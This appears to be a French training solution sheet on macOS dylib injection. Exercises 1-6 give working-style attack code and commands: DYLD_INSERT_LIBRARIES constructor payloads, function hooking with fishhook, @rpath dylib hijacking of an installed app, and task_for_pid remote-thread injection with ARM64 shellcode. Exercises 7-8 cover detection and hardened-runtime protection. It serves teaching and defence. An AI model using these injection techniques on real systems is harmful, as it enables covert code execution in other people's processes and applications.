# SOLUTION : Dylib Injection macOS

## Exercice 1 : DYLD_INSERT_LIBRARIES basique

**malicious.c** :
```c
// malicious.c
#include <stdio.h>
#include <unistd.h>

__attribute__((constructor))
static void init() {
    printf("[+] Malicious dylib loaded! PID: %d\n", getpid());
    printf("[+] Current user: %s\n", getenv("USER"));
}

__attribute__((destructor))
static void fini() {
    printf("[+] Malicious dylib unloaded\n");
}
```

**Compilation** :
```bash
# Compiler en dylib
clang -dynamiclib malicious.c -o malicious.dylib

# Tester avec /bin/ls
DYLD_INSERT_LIBRARIES=./malicious.dylib /bin/ls

# Sortie:
# [+] Malicious dylib loaded! PID: 12345
# [+] Current user: username
# (puis sortie normale de ls)
```

---

## Exercice 2 : Dylib injection avec DYLD_FORCE_FLAT_NAMESPACE

```c
// hook_printf.c
#include <stdio.h>
#include <stdarg.h>

// Override printf
int printf(const char *format, ...) {
    va_list args;
    va_start(args, format);

    // Notre logique
    fprintf(stderr, "[HOOKED] printf called: ");
    int ret = vfprintf(stderr, format, args);

    va_end(args);
    return ret;
}
```

**Compilation et injection** :
```bash
# Compiler
clang -dynamiclib hook_printf.c -o hook_printf.dylib

# Injecter (nécessite FLAT namespace)
DYLD_FORCE_FLAT_NAMESPACE=1 DYLD_INSERT_LIBRARIES=./hook_printf.dylib /bin/ls
```

---

## Exercice 3 : Function hooking avec fishhook

**Installation fishhook** :
```bash
git clone https://github.com/facebook/fishhook
```

**hook_open.c** :
```c
// hook_open.c
#include "fishhook.h"
#include <stdio.h>
#include <fcntl.h>
#include <string.h>

// Pointeur vers l'original open()
static int (*orig_open)(const char *, int, ...);

// Notre hook
int my_open(const char *path, int oflag, ...) {
    printf("[HOOK] Opening file: %s\n", path);

    // Appeler l'original
    return orig_open(path, oflag);
}

__attribute__((constructor))
static void init() {
    struct rebinding open_rebinding = {"open", my_open, (void *)&orig_open};
    rebind_symbols((struct rebinding[1]){open_rebinding}, 1);

    printf("[+] Hooked open() function\n");
}
```

**Compilation** :
```bash
clang -dynamiclib hook_open.c fishhook/fishhook.c -o hook_open.dylib

# Test
DYLD_INSERT_LIBRARIES=./hook_open.dylib cat /etc/passwd
```

---

## Exercice 4 : Dylib hijacking (library search path)

**1. Trouver une app vulnérable** :

```bash
# Lister les dylibs chargées par une app
otool -L /Applications/VulnerableApp.app/Contents/MacOS/VulnerableApp

# Exemple sortie:
# @rpath/CustomLib.dylib (compatibility version 1.0.0)
# /usr/lib/libSystem.B.dylib (compatibility version 1.0.0)
```

**2. Si @rpath est utilisé, vérifier search paths** :

```bash
otool -l /Applications/VulnerableApp.app/Contents/MacOS/VulnerableApp | grep -A3 LC_RPATH

# Sortie:
#           cmd LC_RPATH
#      cmdsize 32
#         path @executable_path/../Frameworks
```

**3. Créer dylib malveillante** :

```c
// CustomLib.c (fake)
#include <stdio.h>

__attribute__((constructor))
static void hijack() {
    printf("[+] Dylib hijacked!\n");
    // Payload ici
}

// Exporter les symboles attendus par l'app
void legitimate_function() {
    // Fake implementation
}
```

**4. Compiler et placer** :

```bash
# Compiler avec même nom
clang -dynamiclib CustomLib.c -o CustomLib.dylib

# Placer dans search path
cp CustomLib.dylib /Applications/VulnerableApp.app/Contents/Frameworks/

# Lancer app → dylib hijacked exécutée
```

---

## Exercice 5 : task_for_pid + dylib injection

```c
// inject.c
#include <mach/mach.h>
#include <mach-o/dyld_images.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dlfcn.h>

int inject_dylib(pid_t pid, const char *dylib_path) {
    mach_port_t task;
    kern_return_t kr;

    // Get task port (requires root or special entitlement)
    kr = task_for_pid(mach_task_self(), pid, &task);
    if (kr != KERN_SUCCESS) {
        printf("[-] task_for_pid failed: %d\n", kr);
        printf("[-] Need root or com.apple.system-task-ports entitlement\n");
        return 1;
    }

    printf("[+] Got task port for PID %d\n", pid);

    // Allocate memory in target process
    mach_vm_address_t remote_mem = 0;
    mach_vm_size_t mem_size = strlen(dylib_path) + 1;

    kr = mach_vm_allocate(task, &remote_mem, mem_size, VM_FLAGS_ANYWHERE);
    if (kr != KERN_SUCCESS) {
        printf("[-] mach_vm_allocate failed\n");
        return 1;
    }

    printf("[+] Allocated memory at: 0x%llx\n", remote_mem);

    // Write dylib path to target
    kr = mach_vm_write(task, remote_mem, (vm_offset_t)dylib_path, mem_size);
    if (kr != KERN_SUCCESS) {
        printf("[-] mach_vm_write failed\n");
        return 1;
    }

    printf("[+] Written dylib path to target\n");

    // Create remote thread to call dlopen
    // (complex - requires thread_create_running + shellcode)
    // Simplified version - voir exercice suivant

    return 0;
}

int main(int argc, char *argv[]) {
    if (argc != 3) {
        printf("Usage: %s <pid> <dylib_path>\n", argv[0]);
        return 1;
    }

    pid_t pid = atoi(argv[1]);
    inject_dylib(pid, argv[2]);

    return 0;
}
```

**Compilation** :
```bash
# Nécessite entitlements
clang inject.c -o inject

# Créer entitlements.plist:
# <key>com.apple.system-task-ports</key><true/>

codesign -s - --entitlements entitlements.plist inject

# Usage (root requis)
sudo ./inject 1234 /tmp/malicious.dylib
```

---

## Exercice 6 : Injection complète avec thread_create_running

```c
// inject_complete.c
#include <mach/mach.h>
#include <mach/thread_act.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// Shellcode to call dlopen (ARM64)
unsigned char shellcode_arm64[] = {
    // x0 = dylib path
    // x1 = RTLD_NOW (2)
    // Call dlopen
    // Simplifié - vrai shellcode nécessite offset calculation
    0x00, 0x00, 0x80, 0xd2,  // mov x0, #0 (will be patched)
    0x42, 0x00, 0x80, 0xd2,  // mov x1, #2
    0x00, 0x00, 0x00, 0x94,  // bl dlopen (offset à calculer)
    0xc0, 0x03, 0x5f, 0xd6   // ret
};

int inject_with_thread(pid_t pid, const char *dylib_path) {
    mach_port_t task;
    kern_return_t kr;

    // Get task
    kr = task_for_pid(mach_task_self(), pid, &task);
    if (kr != KERN_SUCCESS) {
        printf("[-] task_for_pid failed\n");
        return 1;
    }

    // Allocate memory for dylib path
    mach_vm_address_t remote_path = 0;
    size_t path_size = strlen(dylib_path) + 1;

    kr = mach_vm_allocate(task, &remote_path, path_size, VM_FLAGS_ANYWHERE);
    kr = mach_vm_write(task, remote_path, (vm_offset_t)dylib_path, path_size);

    // Allocate memory for shellcode
    mach_vm_address_t remote_code = 0;
    size_t code_size = sizeof(shellcode_arm64);

    kr = mach_vm_allocate(task, &remote_code, code_size, VM_FLAGS_ANYWHERE);

    // Set memory permissions (RWX)
    kr = mach_vm_protect(task, remote_code, code_size, FALSE,
                        VM_PROT_READ | VM_PROT_WRITE | VM_PROT_EXECUTE);

    // Write shellcode
    kr = mach_vm_write(task, remote_code, (vm_offset_t)shellcode_arm64, code_size);

    // Create thread
    thread_act_t remote_thread;

#ifdef __arm64__
    arm_thread_state64_t state = {0};
    state.__pc = remote_code;      // Program counter
    state.__x[0] = remote_path;    // First argument (dylib path)

    kr = thread_create_running(task, ARM_THREAD_STATE64,
                               (thread_state_t)&state,
                               ARM_THREAD_STATE64_COUNT,
                               &remote_thread);
#else
    printf("[-] x86_64 injection not implemented in this example\n");
    return 1;
#endif

    if (kr == KERN_SUCCESS) {
        printf("[+] Remote thread created!\n");
    } else {
        printf("[-] thread_create_running failed: %d\n", kr);
    }

    return 0;
}

int main(int argc, char *argv[]) {
    if (argc != 3) {
        printf("Usage: %s <pid> <dylib>\n", argv[0]);
        return 1;
    }

    inject_with_thread(atoi(argv[1]), argv[2]);
    return 0;
}
```

**Note** : Ce code est simplifié. Une injection réelle nécessite :
- Calculer offset vers dlopen
- Gérer stack alignment
- Restaurer le thread après injection

---

## Exercice 7 : Détecter injections (Blue Team)

```c
// detect_injection.c
#include <mach-o/dyld.h>
#include <stdio.h>
#include <string.h>

void detect_injected_dylibs() {
    uint32_t count = _dyld_image_count();

    printf("[*] Searching for suspicious dylibs...\n\n");

    for (uint32_t i = 0; i < count; i++) {
        const char *image_name = _dyld_get_image_name(i);

        // Check for suspicious paths
        if (strstr(image_name, "/tmp/") ||
            strstr(image_name, "/private/var/tmp/") ||
            strstr(image_name, "malicious") ||
            strstr(image_name, ".dylib") && !strstr(image_name, "/System/") &&
                                           !strstr(image_name, "/usr/lib/")) {

            printf("[!] SUSPICIOUS: %s\n", image_name);

            // Get load address
            const struct mach_header *header = _dyld_get_image_header(i);
            printf("    Load address: %p\n", header);
        }
    }
}

int main() {
    detect_injected_dylibs();
    return 0;
}
```

---

## Exercice 8 : Protection contre injection

```c
// protect_injection.c
#include <stdio.h>
#include <stdlib.h>
#include <dlfcn.h>

void check_environment() {
    // Vérifier variables DYLD_*
    char *vars[] = {
        "DYLD_INSERT_LIBRARIES",
        "DYLD_FORCE_FLAT_NAMESPACE",
        "DYLD_LIBRARY_PATH",
        NULL
    };

    for (int i = 0; vars[i] != NULL; i++) {
        char *val = getenv(vars[i]);
        if (val && strlen(val) > 0) {
            printf("[!] INJECTION DETECTED: %s=%s\n", vars[i], val);
            exit(1);
        }
    }
}

int main() {
    check_environment();
    printf("[+] No injection detected\n");
    return 0;
}
```

**Protection au niveau code signing** :

```bash
# Hardened runtime empêche DYLD_INSERT_LIBRARIES
codesign -s - --options=runtime myapp

# Library Validation (charge seulement dylibs signées)
codesign -s - --options=runtime,library myapp
```

---

## Resources

- [Dylib Hijacking](https://theevilbit.github.io/posts/dyld_insert_libraries_dylib_injection_in_macos_osx_deep_dive/)
- [fishhook](https://github.com/facebook/fishhook)
- [macOS Code Injection](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
- [Hardened Runtime](https://developer.apple.com/documentation/security/hardened_runtime)
